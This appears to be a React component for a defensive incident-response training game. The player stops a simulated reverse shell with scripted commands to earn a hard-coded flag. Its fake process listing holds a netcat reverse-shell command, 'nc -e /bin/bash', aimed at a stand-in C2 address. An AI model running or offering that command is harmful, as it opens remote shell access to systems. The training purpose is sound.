import React, { useState, useEffect } from 'react';
import { ShieldAlert, ShieldCheck, Clock, Terminal, Award, Copy, Check, RotateCcw, X, Zap } from 'lucide-react';
import { cyberSound } from '../../audio/cyberSoundEngine';

interface SOCDefenderModalProps {
  isOpen: boolean;
  onClose: () => void;
}

export const SOCDefenderModal: React.FC<SOCDefenderModalProps> = ({ isOpen, onClose }) => {
  const [timeLeft, setTimeLeft] = useState(60);
  const [stage, setStage] = useState<number>(0); // 0: Start, 1: Triage, 2: Kill PID, 3: Block C2, 4: YARA, 5: Won, 6: Failed
  const [terminalLog, setTerminalLog] = useState<string[]>([
    '[ALERT-CRIT] Frankfurt Core: Port 4444 socket opened by unverified child process.',
    '[ALERT-CRIT] Destination: 198.51.100.99:4444 (Known Cobalt Strike beacon).',
    '[SYSTEM] Incident Response Playbook 0x7F engaged. Complete mitigation in 60s.',
  ]);
  const [commandInput, setCommandInput] = useState('');
  const [copiedFlag, setCopiedFlag] = useState(false);

  // Timer countdown
  useEffect(() => {
    if (!isOpen || stage === 0 || stage === 5 || stage === 6) return;

    if (timeLeft <= 0) {
      setStage(6);
      cyberSound.playAlert();
      cyberSound.speakVoice("Defense breached. Containment failed.");
      return;
    }

    const timer = setInterval(() => {
      setTimeLeft((t) => t - 1);
    }, 1000);

    return () => clearInterval(timer);
  }, [isOpen, stage, timeLeft]);

  if (!isOpen) return null;

  const handleStart = () => {
    cyberSound.playAlert();
    cyberSound.speakVoice("Inbound intrusion alert. Contain threat immediately.");
    setTimeLeft(60);
    setStage(1);
    setTerminalLog([
      '[CTF-INIT] Timer started: 60.00s countdown.',
      '[STEP 1/4] Inspect running processes on Frankfurt Core to locate the malicious backdoor PID.',
      'Hint: Execute `ps aux | grep 4444` or click triage command.',
    ]);
  };

  const handleExecuteAction = (actionKey: string) => {
    cyberSound.playTerminalKey();

    if (stage === 1 && (actionKey === 'ps' || actionKey.includes('ps aux'))) {
      setStage(2);
      cyberSound.playBlip();
      setTerminalLog((prev) => [
        ...prev,
        '> ps aux | grep 4444',
        'UID: root | PID: 1337 | CMD: /bin/sh -c "nc -e /bin/bash 198.51.100.99 4444"',
        '[DETECTED] Malicious process PID 1337 confirmed!',
        '[STEP 2/4] Terminate hostile PID immediately with SIGKILL (`kill -9 1337`).',
      ]);
    } else if (stage === 2 && (actionKey === 'kill' || actionKey.includes('1337'))) {
      setStage(3);
      cyberSound.playLaser();
      setTerminalLog((prev) => [
        ...prev,
        '> kill -9 1337',
        '[SUCCESS] Process 1337 terminated. Socket severed.',
        '[STEP 3/4] Drop all incoming and outgoing packets to hostile C2 node 198.51.100.99.',
        'Hint: Execute `iptables -A INPUT -s 198.51.100.99 -j DROP` or click block C2.',
      ]);
    } else if (stage === 3 && (actionKey === 'iptables' || actionKey.includes('198.51.100.99') || actionKey.includes('DROP'))) {
      setStage(4);
      cyberSound.playPulse();
      setTerminalLog((prev) => [
        ...prev,
        '> iptables -A INPUT -s 198.51.100.99 -j DROP',
        '[SUCCESS] Zero-Trust firewall ACL rule active. C2 IP blocked at perimeter.',
        '[STEP 4/4] Deploy YARA heuristic memory scan to verify no memory hooks remain (`yara -r /rules/backdoor.yar /proc`).',
      ]);
    } else if (stage === 4 && (actionKey === 'yara' || actionKey.includes('yara'))) {
      setStage(5);
      cyberSound.playLaser();
      cyberSound.speakVoice("Threat neutralized. Verification badge generated.");
      setTerminalLog((prev) => [
        ...prev,
        '> yara -r /rules/backdoor.yar /proc',
        '[SCAN-CLEAN] 1,420 memory regions evaluated. 0 lingering hooks.',
        '[INCIDENT RESOLVED] Hostile campaign mitigated in full.',
        '★ FLAG GENERATED: cf-flag{z3r0_tru5t_pr0t3ct0r_99x}',
      ]);
    }
  };

  const handleCommandSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!commandInput.trim()) return;
    handleExecuteAction(commandInput.trim());
    setCommandInput('');
  };

  const flagText = 'cf-flag{z3r0_tru5t_pr0t3ct0r_99x}';

  const handleCopyFlag = () => {
    navigator.clipboard.writeText(flagText);
    setCopiedFlag(true);
    cyberSound.playClick();
    setTimeout(() => setCopiedFlag(false), 2500);
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/85 backdrop-blur-md animate-fadeIn">
      <div className="relative w-full max-w-2xl rounded-2xl bg-[#030914] border border-[#00F0C0]/50 shadow-[0_0_50px_rgba(0,240,192,0.25)] flex flex-col overflow-hidden">
        {/* Top Header */}
        <div className="flex items-center justify-between px-5 py-4 border-b border-white/10 bg-[#061224]">
          <div className="flex items-center gap-2">
            <ShieldAlert className="w-5 h-5 text-rose-500 animate-pulse" />
            <div>
              <h2 className="text-sm font-mono font-bold tracking-wider text-white uppercase">
                SOC Defender CTF: Live Incident Response
              </h2>
              <p className="text-[11px] text-slate-400 font-mono">
                Contain active Cobalt Strike reverse shell under 60 seconds
              </p>
            </div>
          </div>

          <div className="flex items-center gap-3">
            {stage > 0 && stage < 5 && (
              <div
                className={`flex items-center gap-1.5 px-3 py-1 rounded-full font-mono text-xs font-bold border ${
                  timeLeft <= 15
                    ? 'bg-rose-500/20 text-rose-300 border-rose-500 animate-pulse'
                    : 'bg-[#00F0C0]/15 text-[#00F0C0] border-[#00F0C0]/40'
                }`}
              >
                <Clock className="w-3.5 h-3.5" />
                <span>{timeLeft}s</span>
              </div>
            )}
            <button
              onClick={onClose}
              className="p-1 rounded-lg text-slate-400 hover:text-white hover:bg-white/10 transition-colors"
            >
              <X className="w-4 h-4" />
            </button>
          </div>
        </div>

        {/* Content Body */}
        <div className="p-5 flex flex-col gap-4">
          {stage === 0 && (
            <div className="flex flex-col items-center justify-center py-8 text-center">
              <div className="w-16 h-16 rounded-full bg-rose-500/10 border border-rose-500/30 flex items-center justify-center mb-4">
                <Zap className="w-8 h-8 text-rose-400 animate-pulse" />
              </div>
              <h3 className="text-lg font-mono font-bold text-white mb-2">
                MISSION BRIEF: FRANKFURT CLUSTER INTRUSION
              </h3>
              <p className="text-xs text-slate-300 max-w-md font-mono leading-relaxed mb-6">
                An unauthorized process has spawned a remote reverse shell to a C2 IP on port 4444. You have 60 seconds to inspect processes, eliminate the PID, block the IP at perimeter ACL, and deploy memory signatures.
              </p>
              <button
                onClick={handleStart}
                className="px-6 py-2.5 rounded-xl bg-[#00F0C0] hover:bg-[#00E5BE] text-[#040812] font-mono text-xs font-bold tracking-wider transition-all shadow-[0_0_20px_rgba(0,240,192,0.4)] hover:scale-105 active:scale-95"
              >
                START 60s INCIDENT RESPONSE
              </button>
            </div>
          )}

          {stage >= 1 && stage <= 4 && (
            <>
              {/* Terminal Screen */}
              <div className="bg-[#02060E] border border-white/10 rounded-xl p-3 font-mono text-xs text-slate-200 h-56 overflow-y-auto flex flex-col justify-end space-y-1">
                {terminalLog.map((log, idx) => (
                  <div
                    key={idx}
                    className={`${
                      log.startsWith('>')
                        ? 'text-[#00F0C0] font-bold'
                        : log.includes('SUCCESS')
                        ? 'text-emerald-400'
                        : log.includes('ALERT')
                        ? 'text-rose-400'
                        : 'text-slate-300'
                    }`}
                  >
                    {log}
                  </div>
                ))}
              </div>

              {/* Tactical Quick Action Shortcuts */}
              <div className="flex flex-wrap gap-2 pt-1">
                {stage === 1 && (
                  <button
                    onClick={() => handleExecuteAction('ps')}
                    className="px-3 py-1.5 rounded-lg bg-blue-500/20 hover:bg-blue-500/30 text-blue-300 border border-blue-500/40 text-xs font-mono font-semibold transition-all hover:scale-105"
                  >
                    🔍 Run: ps aux | grep 4444
                  </button>
                )}
                {stage === 2 && (
                  <button
                    onClick={() => handleExecuteAction('kill')}
                    className="px-3 py-1.5 rounded-lg bg-rose-500/20 hover:bg-rose-500/30 text-rose-300 border border-rose-500/50 text-xs font-mono font-semibold transition-all animate-pulse hover:scale-105"
                  >
                    ⚡ Execute: kill -9 1337
                  </button>
                )}
                {stage === 3 && (
                  <button
                    onClick={() => handleExecuteAction('iptables')}
                    className="px-3 py-1.5 rounded-lg bg-amber-500/20 hover:bg-amber-500/30 text-amber-300 border border-amber-500/50 text-xs font-mono font-semibold transition-all hover:scale-105"
                  >
                    🛡️ Firewall: iptables -A INPUT -s 198.51.100.99 -j DROP
                  </button>
                )}
                {stage === 4 && (
                  <button
                    onClick={() => handleExecuteAction('yara')}
                    className="px-3 py-1.5 rounded-lg bg-purple-500/20 hover:bg-purple-500/30 text-purple-300 border border-purple-500/50 text-xs font-mono font-semibold transition-all hover:scale-105"
                  >
                    🧪 Deploy: yara -r /rules/backdoor.yar /proc
                  </button>
                )}
              </div>

              {/* Command Prompt Line */}
              <form onSubmit={handleCommandSubmit} className="flex gap-2">
                <div className="flex-1 flex items-center gap-2 px-3 py-2 rounded-xl bg-white/[0.04] border border-white/10 focus-within:border-[#00F0C0]/60">
                  <Terminal className="w-3.5 h-3.5 text-[#00F0C0]" />
                  <input
                    type="text"
                    value={commandInput}
                    onChange={(e) => setCommandInput(e.target.value)}
                    placeholder="Type bash command here..."
                    className="w-full bg-transparent text-xs font-mono text-white outline-none placeholder:text-slate-500"
                    autoFocus
                  />
                </div>
                <button
                  type="submit"
                  className="px-4 py-2 rounded-xl bg-[#00F0C0]/20 hover:bg-[#00F0C0]/30 border border-[#00F0C0]/50 text-[#00F0C0] font-mono text-xs font-bold transition-all"
                >
                  EXEC
                </button>
              </form>
            </>
          )}

          {stage === 5 && (
            <div className="flex flex-col items-center justify-center py-6 text-center animate-fadeIn">
              <div className="w-16 h-16 rounded-full bg-emerald-500/20 border border-emerald-500/50 flex items-center justify-center mb-3 shadow-[0_0_30px_rgba(16,185,129,0.35)]">
                <Award className="w-8 h-8 text-emerald-400" />
              </div>
              <h3 className="text-lg font-mono font-bold text-white mb-1">
                INCIDENT RESPONSE SUCCESSFUL
              </h3>
              <p className="text-xs text-slate-300 font-mono max-w-sm mb-4">
                You successfully neutralized the APT backdoor with {timeLeft}s remaining on the clock!
              </p>

              {/* Cryptographic Proof Flag Card */}
              <div className="w-full p-4 rounded-xl bg-[#051122] border border-emerald-500/40 mb-4">
                <div className="text-[10px] font-mono uppercase tracking-widest text-emerald-400 mb-1 font-semibold">
                  Official Verification Proof
                </div>
                <div className="flex items-center justify-between p-2 rounded bg-[#02060E] border border-white/10 font-mono text-xs text-white">
                  <span>{flagText}</span>
                  <button
                    onClick={handleCopyFlag}
                    className="flex items-center gap-1 px-2.5 py-1 rounded bg-[#00F0C0]/20 hover:bg-[#00F0C0]/30 text-[#00F0C0] text-[11px] font-bold transition-all"
                  >
                    {copiedFlag ? <Check className="w-3 h-3" /> : <Copy className="w-3 h-3" />}
                    <span>{copiedFlag ? 'COPIED' : 'COPY'}</span>
                  </button>
                </div>
              </div>

              <div className="flex gap-3">
                <button
                  onClick={handleStart}
                  className="px-4 py-2 rounded-xl bg-white/5 hover:bg-white/10 border border-white/10 text-xs font-mono text-slate-300 transition-colors"
                >
                  REPLAY SCENARIO
                </button>
                <button
                  onClick={onClose}
                  className="px-5 py-2 rounded-xl bg-[#00F0C0] hover:bg-[#00E5BE] text-[#040812] text-xs font-mono font-bold transition-all"
                >
                  CLOSE HUD
                </button>
              </div>
            </div>
          )}

          {stage === 6 && (
            <div className="flex flex-col items-center justify-center py-6 text-center animate-fadeIn">
              <ShieldAlert className="w-12 h-12 text-rose-500 mb-3 animate-pulse" />
              <h3 className="text-base font-mono font-bold text-rose-400 mb-1">
                CONTAINMENT BREACHED: TIMEOUT
              </h3>
              <p className="text-xs text-slate-300 font-mono max-w-sm mb-5">
                The adversary executed their data exfiltration payload before containment was completed.
              </p>
              <button
                onClick={handleStart}
                className="flex items-center gap-2 px-5 py-2.5 rounded-xl bg-rose-500/20 hover:bg-rose-500/30 border border-rose-500/50 text-rose-300 font-mono text-xs font-bold transition-all"
              >
                <RotateCcw className="w-3.5 h-3.5" />
                <span>RETRY DEFENSE</span>
              </button>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};
